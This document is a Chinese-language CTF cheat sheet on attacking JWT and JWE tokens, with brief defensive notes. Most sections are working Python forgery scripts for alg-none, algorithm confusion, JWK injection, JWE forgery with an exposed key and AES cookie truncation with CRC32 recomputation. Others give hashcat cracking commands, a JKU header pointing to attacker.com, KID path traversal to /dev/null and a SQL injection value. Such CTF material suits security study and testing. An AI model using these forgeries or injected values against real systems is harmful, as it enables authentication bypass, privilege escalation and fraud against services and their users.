# CTF Web - JWT 与 JWE Token 攻击

## 目录
- [算法 None](#算法-none)
- [算法混淆（RS256 转 HS256）](#算法混淆rs256-转-hs256)
- [弱密钥爆破](#弱密钥爆破)
- [不校验签名（Crypto-Cat）](#不校验签名crypto-cat)
- [JWK 头注入（Crypto-Cat）](#jwk-头注入crypto-cat)
- [JKU 头注入（Crypto-Cat）](#jku-头注入crypto-cat)
- [KID 路径穿越（Crypto-Cat）](#kid-路径穿越crypto-cat)
- [JWT 余额重放（MetaShop 模式）](#jwt-余额重放metashop-模式)
- [公钥暴露时的 JWE Token 伪造（UTCTF 2026）](#公钥暴露时的-jwe-token-伪造utctf-2026)
- [AES Cookie 长度字段截断 + CRC32 替换（DefCamp 2018）](#aes-cookie-长度字段截断--crc32-替换defcamp-2018)

通用认证绕过、访问控制与会话攻击见 [auth-and-access.md](auth-and-access.md)。OAuth/OIDC、SAML、CI/CD 凭据窃取与基础设施认证攻击见 [auth-infra.md](auth-infra.md)。

## 现代 JWT/JWE 补充（2025/2026）

### 公钥暴露时的 JWE 公钥伪造

若应用用 JWE 加密敏感声明并暴露了公钥（例如经 JWKS、`/api/key` 或静态配置文件），攻击者就能用该公钥加密任意声明后提交给服务器。如果服务器解密后不做额外校验就信任这些声明，应用实际上就接受了攻击者签出/加密的状态。

**快速检测：** 找 5 段式 compact JWE（`header.encrypted_key.iv.ciphertext.tag`），以及 `.well-known`、元数据页面、配置文件或应用诊断信息中的公钥端点。

**利用模式：**
1. 取服务器公钥
2. 用 `RSA-OAEP-*` / `A256GCM` 加密伪造的 JSON payload
3. 把 token 作为 cookie/header 发送
4. 验证服务器是否解密并信任伪造声明

### JWT 声明混淆：身份声明 vs 授权声明

常见的现代缺陷是：服务器已经建立了认证会话或身份上下文，却仍信任 token 里的 `email`、`username` 或 `role`。应用可能拿 token 声明去比对数据库，但从不把它们重新绑定到真实用户记录。

**检查项：**
- 比对 `sub`、`oid`、`email`、`role` 与 `scope`
- 确保 `sub` 不可变且不受用户控制
- 确认在授予更高权限前，服务端会重新查数据库或 IdP

### JWT 重放与过期会话接受

当题目允许 JWT 重放时，旧 token 在密码重置、MFA 变更或管理员降权之后仍可使用。这往往是状态机缺陷，而非密码学缺陷。

**优先检查：** 改密码时重签 token、作废旧 token、要求短时效 access token 配合服务端吊销或 refresh token 轮换。

### KID/JKU/JWK 混淆与 URL 拉取

JWT 伪造的一个现代变体是让服务器从 token 指定的远端或本地路径取密钥。服务器随后信任取来的密钥去验签。若 URL 或路径未严格校验，应用就变成了"SSRF 到 token 伪造"的原语。

**示例模式：**
- `kid` 路径穿越到 `/dev/null` 或某个可预测文件
- `jku` 指向攻击者控制的 JWKS 端点
- 内嵌 `jwk` 对象，携带攻击者生成的密钥材料

---

<a id="algorithm-none"></a>
## 算法 None
去掉签名，在 header 里设置 `"alg": "none"`。

<a id="algorithm-confusion-rs256-to-hs256"></a>
## 算法混淆（RS256 转 HS256）
应用同时接受 RS256 和 HS256，且两种情况都用公钥：
```javascript
const jwt = require('jsonwebtoken');
const publicKey = '-----BEGIN PUBLIC KEY-----\n...\n-----END PUBLIC KEY-----';
const token = jwt.sign({ username: 'admin' }, publicKey, { algorithm: 'HS256' });
```

<a id="weak-secret-brute-force"></a>
## 弱密钥爆破
```bash
flask-unsign --decode --cookie "eyJ..."
hashcat -m 16500 jwt.txt wordlist.txt
```

<a id="unverified-signature-crypto-cat"></a>
## 不校验签名（Crypto-Cat）
服务端只解码 JWT 而不验签。修改 payload 声明后用原始（未被检查的）签名重新编码：
```python
import jwt, base64, json

token = "eyJ..."
parts = token.split('.')
payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
payload['sub'] = 'administrator'
new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
forged = f"{parts[0]}.{new_payload}.{parts[2]}"
```
**关键点：** 部分 JWT 库把 `decode()`（不验签）和 `verify()` 分成两个函数。若服务端只调用 `decode()`，签名根本不会被检查。

<a id="jwk-header-injection-crypto-cat"></a>
## JWK 头注入（Crypto-Cat）
服务端接受 JWT header 中内嵌的 JWK（JSON Web Key）且不做校验。用攻击者生成的 RSA 私钥签名，并嵌入对应的公钥：
```python
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
import jwt, base64

private_key = rsa.generate_private_key(65537, 2048, default_backend())
public_numbers = private_key.public_key().public_numbers()

jwk = {
    "kty": "RSA",
    "kid": original_header['kid'],
    "e": base64.urlsafe_b64encode(public_numbers.e.to_bytes((public_numbers.e.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode(),
    "n": base64.urlsafe_b64encode(public_numbers.n.to_bytes((public_numbers.n.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode()
}
forged = jwt.encode({"sub": "administrator"}, private_key, algorithm='RS256', headers={'jwk': jwk})
```
**关键点：** 服务端从 token 自身提取公钥，而不是使用存储的密钥。密钥和签名全在攻击者手里。

<a id="jku-header-injection-crypto-cat"></a>
## JKU 头注入（Crypto-Cat）
服务端从 JKU（JSON Key URL）头指定的 URL 拉取公钥，且不校验 URL：
```python
# 1. Host JWKS at attacker-controlled URL
jwks = {"keys": [attacker_jwk]}  # POST to webhook.site or attacker server

# 2. Forge token pointing to attacker JWKS
forged = jwt.encode(
    {"sub": "administrator"},
    attacker_private_key,
    algorithm='RS256',
    headers={'jku': 'https://attacker.com/.well-known/jwks.json'}
)
```
**关键点：** 把 SSRF 与 token 伪造结合起来。服务器会发起外连请求取密钥，并信任 token 指定的任何 URL。

<a id="kid-path-traversal-crypto-cat"></a>
## KID 路径穿越（Crypto-Cat）
KID（Key ID）头被用于拼接密钥查找的文件路径。指向可预测文件：
```python
# /dev/null returns empty bytes -> HMAC key is empty string
forged = jwt.encode(
    {"sub": "administrator"},
    '',  # Empty string as secret
    algorithm='HS256',
    headers={"kid": "../../../dev/null"}
)
```
**变体：**
- `../../../dev/null` → 空密钥
- `../../../proc/sys/kernel/hostname` → 内容可预测的密钥
- KID 处 SQL 注入：`' UNION SELECT 'known-secret' --`（当 KID 会查数据库时）

**关键点：** KID 本意是选择验签用哪个密钥。当它未经清洗被用在文件路径或 SQL 查询中时，就成了注入点。

<a id="jwt-balance-replay-metashop-pattern"></a>
## JWT 余额重放（MetaShop 模式）
1. 注册 → 拿到 balance=$100 的 JWT（保存它）
2. 买东西 → 余额降到 $0
3. 把 cookie 换回保存的 JWT（余额又变回 $100）
4. 退回所有商品 → 服务端按价格往 JWT 的 $100 上加
5. 反复操作直到余额超过目标价格

**关键点：** 服务端在做退款计算时信任 JWT 里的余额，却不交叉核对购买历史。

<a id="jwe-token-forgery-with-exposed-public-key-utctf-2026"></a>
## 公钥暴露时的 JWE Token 伪造（UTCTF 2026）

**模式（Break the Bank）：** 应用使用 JWE（JSON Web Encryption）token 而非 JWT。RSA 公钥暴露（如经 `/api/key`、`.well-known/jwks.json` 或页面源码）。服务端用私钥解密 JWE —— 攻击者用公钥加密伪造声明即可。

**与 JWT 的关键区别：** JWE token 是**加密的**（保密性），不只是签名。服务端会解密。拿到公钥就能加密任意声明，并被服务器信任。

```python
from jwcrypto import jwk, jwe
import json

# 1. Fetch the server's public key
# GET /api/key or extract from JWKS endpoint
public_key_pem = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkq...
-----END PUBLIC KEY-----"""

# 2. Create JWK from public key
key = jwk.JWK.from_pem(public_key_pem.encode())

# 3. Forge claims (e.g., set balance to 999999)
forged_claims = {
    "sub": "attacker",
    "balance": 999999,
    "role": "admin"
}

# 4. Encrypt with server's public key
token = jwe.JWE(
    json.dumps(forged_claims).encode(),
    recipient=key,
    protected=json.dumps({
        "alg": "RSA-OAEP-256",  # or RSA-OAEP, RSA1_5
        "enc": "A256GCM"         # or A128CBC-HS256
    })
)
forged_jwe = token.serialize(compact=True)
# 5. Send forged token as cookie/header
```

**检测：** token 有 5 段以点分隔的 base64url（JWE compact 格式：header.enckey.iv.ciphertext.tag），而 JWT 只有 3 段。存在暴露 RSA 公钥的端点。

**关键点：** JWE 加密 ≠ 认证。如果服务端信任任何能解密的 token、不做额外签名校验，暴露公钥就等于让你伪造任意声明。留意公钥端点，并尝试加密篡改后的 payload。

---

<a id="aes-cookie-length-field-truncation--crc32-swap-defcamp-2018"></a>
## AES Cookie 长度字段截断 + CRC32 替换（DefCamp 2018）

**模式：** session cookie 的结构为 `AES(key¡value÷...¡)+<len>+<CRC32>`。应用只解析解密数据块的前 `<len>` 字节，并用 CRC32 校验完整性。注册时攻击者控制明文：在用户名前部嵌入 `id¡1¡`，把 `<len>` 改小以在该处截断，再对截短后的 payload 重算 CRC32。反序列化器于是看到 `id=1`（admin），而 CRC32 校验仍能通过，因为 CRC32 不是 MAC。

```python
import struct, zlib, requests, base64

# 1. Register with a username that embeds the target field early.
#    The challenge stores fields as key\xa1value\xf7, AES-encrypts them,
#    then appends a 2-byte length and a 4-byte CRC32.
payload_fields = b"name\xa1attacker\xf7id\xa11\xf7role\xa1user\xf7"
# 2. Grab the encrypted cookie the server set.
sess = requests.Session()
sess.post("http://target/register",
          data={"user": "attacker", "pass": "x", "payload": payload_fields})
cookie = base64.b64decode(sess.cookies["session"])
ct, rest = cookie[:-6], cookie[-6:]          # split off length + CRC32
# 3. Truncate: keep only bytes up to and including "id\xa11\xf7"
truncated_plain = b"name\xa1attacker\xf7id\xa11\xf7"
new_len = struct.pack("<H", len(truncated_plain))
new_crc = struct.pack("<I", zlib.crc32(ct[: len(truncated_plain)]))
forged = base64.b64encode(ct[: len(truncated_plain)] + new_len + new_crc)
sess.cookies["session"] = forged.decode()
print(sess.get("http://target/admin").text)
```

**关键点：** CRC32 是校验和，不是消息认证码 —— 它是线性的，翻转密文任意比特再重算 CRC，得到的 cookie 依旧"有效"。配合告诉解析器解码多少字节的长度字段，攻击者可以在任意位置截断（或扩展）明文。审计那些解密后是长度前缀 payload 的 cookie，看清签名算法：若是 `crc32`、`adler32`、`md5` 或任何非 HMAC/AEAD 的算法，直接按可伪造处理。

**参考：** DefCamp CTF Qualification 2018 — Get Admin，writeup 11430
